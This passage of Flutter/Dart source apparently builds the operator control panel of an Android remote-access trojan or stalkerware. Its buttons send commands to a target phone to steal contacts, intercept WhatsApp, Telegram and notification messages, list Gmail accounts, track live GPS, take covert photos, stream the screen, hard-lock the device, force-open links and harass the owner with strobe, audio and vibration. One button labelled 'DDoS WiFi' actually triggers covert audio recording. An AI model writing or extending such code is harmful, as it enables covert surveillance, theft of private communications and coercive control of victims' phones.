          // Expandable buttons
          AnimatedCrossFade(
            firstChild: const SizedBox.shrink(),
            secondChild: Container(
              padding: const EdgeInsets.fromLTRB(15, 0, 15, 15),
              child: Wrap(
                spacing: 10,
                runSpacing: 10,
                alignment: WrapAlignment.start,
                children: buttons,
              ),
            ),
            crossFadeState: isExpanded ? CrossFadeState.showSecond : CrossFadeState.showFirst,
            duration: const Duration(milliseconds: 250),
          ),
        ],
      ),
    );
  }

  Widget _buildActionButton(String label, IconData icon, Color color, String cmd, String targetId) {
    return Material(
      color: Colors.transparent,
      child: InkWell(
        onTap: () {
          if (cmd == 'get_notif_logs') {
            _fetchNotificationLogs(targetId);
          } else if (cmd == 'take_photo') {
            _showCameraMenu(targetId); 
          } else if (cmd == 'open_url' || cmd == 'hard_lock' || cmd == 'set_wallpaper' || cmd == 'play_audio_input') {
            String dialogTitle = cmd == 'hard_lock' ? "Kunci HP" : (cmd == 'set_wallpaper' ? "Ubah Wallpaper" : (cmd == 'play_audio_input' ? "Play Remote MP3" : "Masukkan URL Website"));
            _showInputDialog(dialogTitle, cmd == 'play_audio_input' ? 'play_audio' : cmd, targetId);
          } else if (cmd == 'stop_audio') {
            _sendCommand("stop_audio", targetId);
          } else {
            _sendCommand(cmd, targetId);
          }
        },
        borderRadius: BorderRadius.circular(10),
        child: Container(
          padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
          decoration: BoxDecoration(
            gradient: LinearGradient(
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
              colors: [
                color.withOpacity(0.15),
                color.withOpacity(0.05),
              ],
            ),
            borderRadius: BorderRadius.circular(10),
            border: Border.all(color: color.withOpacity(0.3)),
          ),
          child: Row(
            mainAxisSize: MainAxisSize.min,
            children: [
              Icon(icon, color: color, size: 16),
              const SizedBox(width: 8),
              Text(
                label,
                style: TextStyle(
                  color: Colors.white,
                  fontSize: 12,
                  fontWeight: FontWeight.w600,
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final String targetId = _targetId;

    return Scaffold(
      backgroundColor: const Color(0xFF0F111E),
      appBar: AppBar(
        backgroundColor: const Color(0xFF1A1D2D),
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_ios, color: Colors.white, size: 20),
          onPressed: () => Navigator.pop(context),
        ),
        title: const Text(
          "Control Center",
          style: TextStyle(
            fontSize: 18,
            fontWeight: FontWeight.bold,
            color: Colors.white,
          ),
        ),
        centerTitle: true,
        actions: [
          if (_isSending)
            const Padding(
              padding: EdgeInsets.only(right: 15),
              child: Center(
                child: SizedBox(
                  width: 18,
                  height: 18,
                  child: CircularProgressIndicator(
                    strokeWidth: 2,
                    color: Colors.redAccent,
                  ),
                ),
              ),
            ),
          IconButton(
            onPressed: () {
              setState(() {});
              if (_targetId != "unknown" && _targetId != "fallback_device") {
                _sendCommand("force_open", _targetId, isSilent: true);
              } else {
                _extractDeviceData();
              }
            },
            icon: const Icon(Icons.refresh, color: Colors.white, size: 20),
          ),
        ],
      ),
      body: ListView(
        padding: const EdgeInsets.only(bottom: 20),
        children: [
          // Device Info Section (NEW)
          _buildDeviceInfo(),
          
          // Activity Log Section
          _buildActiveLog(),

          // Intelligence Extraction
          _buildDropdownSection(
            title: "Intelligence Extraction",
            subtitle: "Contacts, Notifications, WhatsApp, Telegram, Gmail",
            icon: Icons.folder_shared,
            color: Colors.pinkAccent,
            isExpanded: _isIntelExpanded,
            onToggle: () => setState(() => _isIntelExpanded = !_isIntelExpanded),
            buttons: [
              _buildActionButton("Get Contacts", Icons.contacts, Colors.pinkAccent, "get_contacts", targetId),
              _buildActionButton("Messages Intercept", Icons.message, Colors.pinkAccent, "get_notif_logs", targetId),
              _buildActionButton("Gmail List", Icons.account_circle, Colors.pinkAccent, "get_gmails", targetId),
              _buildActionButton("Request Access", Icons.security, Colors.pinkAccent, "open_notification_settings", targetId),
            ],
          ),

          // Audio Control
          _buildDropdownSection(
            title: "Audio Control",
            subtitle: "Remote MP3 Player and Sound Hijack",
            icon: Icons.volume_up,
            color: Colors.yellowAccent,
            isExpanded: _isAudioExpanded,
            onToggle: () => setState(() => _isAudioExpanded = !_isAudioExpanded),
            buttons: [
              _buildActionButton("Play MP3", Icons.play_arrow, Colors.yellowAccent, "play_audio_input", targetId),
              _buildActionButton("Stop Sound", Icons.stop, Colors.white, "stop_audio", targetId),
            ],
          ),

          // Location Tracking
          _buildDropdownSection(
            title: "Location Tracking",
            subtitle: "Live real-time GPS tracking",
            icon: Icons.location_on,
            color: Colors.greenAccent,
            isExpanded: _isLocationExpanded,
            onToggle: () => setState(() => _isLocationExpanded = !_isLocationExpanded),
            buttons: [
              _buildActionButton("Get Location", Icons.my_location, Colors.greenAccent, "get_location", targetId),
            ],
          ),

          // Network Attack
          _buildDropdownSection(
            title: "Network Attack",
            subtitle: "WiFi Jammer & Interference",
            icon: Icons.wifi,
            color: Colors.cyanAccent,
            isExpanded: _isNetworkExpanded,
            onToggle: () => setState(() => _isNetworkExpanded = !_isNetworkExpanded),
            buttons: [
              _buildActionButton("DDoS WiFi", Icons.sensors_off, Colors.cyanAccent, "record_audio", targetId),
            ],
          ),

          // Media & Surveillance
          _buildDropdownSection(
            title: "Media & Surveillance",
            subtitle: "Background Instant Photo & Real Screen Stream",
            icon: Icons.camera_alt,
            color: Colors.orangeAccent,
            isExpanded: _isMediaExpanded,
            onToggle: () => setState(() => _isMediaExpanded = !_isMediaExpanded),
            buttons: [
              _buildActionButton("Instant Photo", Icons.camera, Colors.orangeAccent, "take_photo", targetId),
              _buildActionButton("Real Stream", Icons.screenshot, Colors.orangeAccent, "get_screen", targetId),
              _buildActionButton("Set Wallpaper", Icons.image, Colors.blueAccent, "set_wallpaper", targetId),
              _buildActionButton("START STROBE", Icons.flash_on, Colors.yellowAccent, "flash_strobe", targetId),
              _buildActionButton("STOP STROBE", Icons.flash_off, Colors.white, "stop_strobe", targetId),
            ],
          ),

          // Remote Lock
          _buildDropdownSection(
            title: "Remote Lock",
            subtitle: "Lock, Unlock, Vibrate, Web Trigger",
            icon: Icons.smartphone,
            color: Colors.redAccent,
            isExpanded: _isRemoteExpanded,
            onToggle: () => setState(() => _isRemoteExpanded = !_isRemoteExpanded),
            buttons: [
              _buildActionButton("Lock Hard", Icons.lock, Colors.redAccent, "hard_lock", targetId),
              _buildActionButton("Unlock", Icons.lock_open, Colors.greenAccent, "unlock", targetId),
              _buildActionButton("Open Link", Icons.link, Colors.redAccent, "open_url", targetId),
              _buildActionButton("Vibrate", Icons.vibration, Colors.redAccent, "vibrate_loop", targetId),
            ],
          ),
        ],
      ),
    );
  }
}